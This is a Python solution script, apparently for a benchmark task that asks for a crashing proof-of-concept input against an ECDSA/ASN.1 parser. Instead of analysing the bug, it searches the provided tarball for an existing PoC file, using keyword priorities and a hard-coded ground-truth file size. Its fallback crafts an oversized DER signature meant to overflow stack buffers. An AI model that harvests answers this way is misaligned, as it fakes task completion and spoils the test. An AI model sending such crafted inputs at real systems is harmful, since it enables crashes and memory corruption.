import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC input that triggers the vulnerability.
        """
        try:
            poc = self._find_poc_in_tar(src_path)
            if poc is not None:
                return poc
        except Exception:
            pass
        return self._fallback_poc()

    def _find_poc_in_tar(self, src_path: str) -> Optional[bytes]:
        """
        Try to locate a ground-truth PoC file inside the source tarball.
        """
        try:
            tf = tarfile.open(src_path, "r:*")
        except (tarfile.TarError, FileNotFoundError, OSError):
            return None

        with tf:
            members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]
            if not members:
                return None

            L_G = 41798

            blocked_exts = {
                ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
                ".txt", ".md", ".rst", ".py", ".pyc", ".pyo",
                ".java", ".go", ".rs", ".js", ".ts",
                ".html", ".htm", ".xml", ".json", ".toml", ".ini",
                ".yml", ".yaml", ".sh", ".bat", ".cmd",
                ".cmake", ".mak", ".make", ".in", ".ac",
                ".m4",
            }

            keyword_priorities = [
                ("50683", 0),
                ("poc", 1),
                ("proof", 2),
                ("crash", 3),
                ("overflow", 4),
                ("stack", 5),
                ("sig", 6),
                ("ecdsa", 7),
                ("asn1", 8),
                ("asn", 9),
                ("input", 10),
                ("id_", 11),
                ("seed", 12),
                ("sample", 13),
                ("testcase", 14),
                ("fuzz", 15),
            ]

            candidate_infos = []
            for m in members:
                name_lower = m.name.lower()
                _, ext = os.path.splitext(name_lower)

                assigned_priority: Optional[int] = None
                for kw, pri in keyword_priorities:
                    if kw in name_lower:
                        assigned_priority = pri
                        break

                if assigned_priority is None:
                    continue

                penalty = 20 if ext in blocked_exts else 0
                final_priority = assigned_priority + penalty
                size_diff = abs(m.size - L_G)
                candidate_infos.append((final_priority, size_diff, m))

            if candidate_infos:
                candidate_infos.sort(key=lambda t: (t[0], t[1], t[2].size))
                for _, _, m in candidate_infos:
                    sample = self._read_member(tf, m, max_bytes=512)
                    if sample is None:
                        continue
                    if self._is_probably_binary(sample):
                        full = self._read_member(tf, m, max_bytes=None)
                        if full is not None:
                            return full
                top_member = candidate_infos[0][2]
                full = self._read_member(tf, top_member, max_bytes=None)
                if full is not None:
                    return full

            # Fallback pass: look for file with exact ground-truth size and non-source extension
            exact_size_candidates = []
            for m in members:
                if m.size != L_G:
                    continue
                name_lower = m.name.lower()
                _, ext = os.path.splitext(name_lower)
                if ext in blocked_exts:
                    continue
                exact_size_candidates.append(m)

            if len(exact_size_candidates) == 1:
                full = self._read_member(tf, exact_size_candidates[0], max_bytes=None)
                if full is not None:
                    return full

        return None

    def _read_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, max_bytes: Optional[int]) -> Optional[bytes]:
        """
        Safely read up to max_bytes from a tar member. If max_bytes is None, read all.
        """
        try:
            f = tf.extractfile(member)
            if f is None:
                return None
            try:
                if max_bytes is None:
                    return f.read()
                return f.read(max_bytes)
            finally:
                f.close()
        except (tarfile.TarError, OSError):
            return None

    def _is_probably_binary(self, data: bytes) -> bool:
        """
        Heuristic to decide whether data looks like a binary blob rather than text.
        """
        if not data:
            return False
        if b"\x00" in data:
            return True
        nontext = 0
        length = len(data)
        for b in data:
            if b < 9 or (13 < b < 32) or b > 126:
                nontext += 1
        return nontext > length * 0.3

    def _fallback_poc(self) -> bytes:
        """
        Construct a generic ASN.1 DER-encoded ECDSA signature with oversized INTEGERs,
        which may trigger stack-based overflows in vulnerable parsers.
        """
        # Choose large but short-form lengths to avoid long-form complications.
        r_len = 103  # > typical 32/72-byte buffers
        s_len = 20
        seq_len = r_len + s_len + 4  # two INTEGER headers plus contents
        if seq_len > 127:
            seq_len = 127
            # Adjust r_len to keep total consistent.
            # seq_len = r_len + s_len + 4  => r_len = seq_len - s_len - 4
            r_len = seq_len - s_len - 4
            if r_len < 1:
                r_len = 1
                s_len = seq_len - r_len - 4
                if s_len < 1:
                    s_len = 1

        data = bytearray()
        # SEQUENCE header
        data.append(0x30)
        data.append(seq_len)

        # INTEGER r
        data.append(0x02)
        data.append(r_len)
        # First byte 0x01 ensures positive integer without leading zero
        data.append(0x01)
        if r_len > 1:
            data.extend(b"\x41" * (r_len - 1))

        # INTEGER s
        data.append(0x02)
        data.append(s_len)
        data.append(0x01)
        if s_len > 1:
            data.extend(b"\x42" * (s_len - 1))

        return bytes(data)